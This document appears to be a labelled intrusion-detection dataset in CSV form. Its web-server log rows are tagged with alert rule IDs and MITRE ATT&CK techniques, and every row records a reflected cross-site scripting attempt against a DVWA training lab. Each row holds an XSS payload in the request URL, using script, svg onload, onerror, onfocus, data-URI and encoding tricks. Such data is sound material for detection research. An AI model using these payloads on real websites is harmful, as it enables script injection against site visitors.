timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T20:54:51.764+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:47 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert('33') HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert('33'),1
2025-03-31T20:54:58.271+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:52 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert&lpar;'33'&rpar; HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3Ealert&lpar;'33'&rpar;,1
2025-03-31T20:55:41.657+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:59:32 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cbody%20onload=alert(/XSS/.source)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cbody%20onload=alert(/XSS/.source)%3E,1
2025-03-31T20:55:45.996+0700,31154,10,302,T1059,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:59:37 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cinput%20autofocus%20onfocus=alert(1)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cinput%20autofocus%20onfocus=alert(1)%3E,1
2025-03-31T20:57:08.428+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:00:52 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cinput%20type=%22hidden%22%20oncontentvisibilityautostatechange=%22alert(1)%22%20%20style=%22content-visibility:auto%22%20%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cinput%20type=%22hidden%22%20oncontentvisibilityautostatechange=%22alert(1)%22%20%20style=%22content-visibility:auto%22%20%3E,1
2025-03-31T20:57:14.936+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:00:57 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3CIMG%20SRC=1%20ONERROR=& HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3CIMG%20SRC=1%20ONERROR=&,1
2025-03-31T20:57:25.780+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:07 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=data:text/html,%3Cscript%3Ealert(0)%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=data:text/html,%3Cscript%3Ealert(0)%3C/script%3E",1
2025-03-31T20:57:36.627+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:17 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%20src=%22data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==%22%3E%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cscript%20src=%22data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==%22%3E%3C/script%3E",1
2025-03-31T20:57:40.969+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:22 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cname%3E%20%20%20%3Cvalue%3E%3C!%5BCDATA%5B%3Cscript%3Econfirm(document.domain)%3C/script%3E%5D%5D%3E%3C/value%3E%20%3C/name%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cname%3E%20%20%20%3Cvalue%3E%3C!%5BCDATA%5B%3Cscript%3Econfirm(document.domain)%3C/script%3E%5D%5D%3E%3C/value%3E%20%3C/name%3E,1
2025-03-31T20:57:47.475+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:27 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Chtml%3E%20%3Chead%3E%3C/head%3E%20%3Cbody%3E%20%3Csomething:script%20xmlns:something=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/something:script%3E%20%3C/body%3E%20%3C/html%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Chtml%3E%20%3Chead%3E%3C/head%3E%20%3Cbody%3E%20%3Csomething:script%20xmlns:something=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/something:script%3E%20%3C/body%3E%20%3C/html%3E,1
2025-03-31T20:57:58.324+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:37 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3C?xml%20version=%221.0%22%20standalone=%22no%22?%3E%20%3C!DOCTYPE%20svg%20PUBLIC%20%22-//W3C//DTD%20SVG%201.1//EN%22%20%22http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd%22%3E%20%20%3Csvg%20version=%221.1%22%20baseProfile=%22full%22%20width=%22100%22%20height=%22100%22%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22alert('svg%20attribut')%22%3E%20%20%20%3Cpolygon%20id=%22lightning%22%20points=%220,100%2050,25%2050,75%20100,0%22%20fill=%22 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3C?xml%20version=%221.0%22%20standalone=%22no%22?%3E%20%3C!DOCTYPE%20svg%20PUBLIC%20%22-//W3C//DTD%20SVG%201.1//EN%22%20%22http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd%22%3E%20%20%3Csvg%20version=%221.1%22%20baseProfile=%22full%22%20width=%22100%22%20height=%22100%22%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22alert('svg%20attribut')%22%3E%20%20%20%3Cpolygon%20id=%22lightning%22%20points=%220,100%2050,25%2050,75%20100,0%22%20fill=%22",1
2025-03-31T20:58:02.663+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:01:42 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22alert(document.domain)%22/%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22alert(document.domain)%22/%3E,1
